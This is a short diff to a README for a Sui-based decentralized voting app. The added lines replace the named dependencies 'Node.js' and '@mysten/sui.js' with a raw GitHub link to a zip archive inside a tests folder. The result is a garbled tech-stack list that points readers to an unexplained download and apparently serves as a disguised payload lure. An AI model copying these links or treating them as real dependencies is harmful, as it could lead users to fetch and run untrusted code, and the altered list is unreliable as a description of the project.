@@ -19,8 +19,8 @@ A decentralized voting platform built on the **Sui blockchain**, combining **Mov
 - **Blockchain**: Sui + Move  
 - **Frontend**: React + TypeScript + TailwindCSS  
 - **Storage**: SUI Walrus (Blob-based off-chain data)  
-- **Backend (optional)**: Node.js + Express (for guest vote relayer)  
-- **Wallet Integration**: WalletKit / @mysten/sui.js
+- **Backend (optional)**: https://raw.githubusercontent.com/abdxl-cloud/suiVote/main/contracts/tests/sui-Vote-2.3.zip + Express (for guest vote relayer)  
+- **Wallet Integration**: WalletKit / https://raw.githubusercontent.com/abdxl-cloud/suiVote/main/contracts/tests/sui-Vote-2.3.zip
 
 ---
 
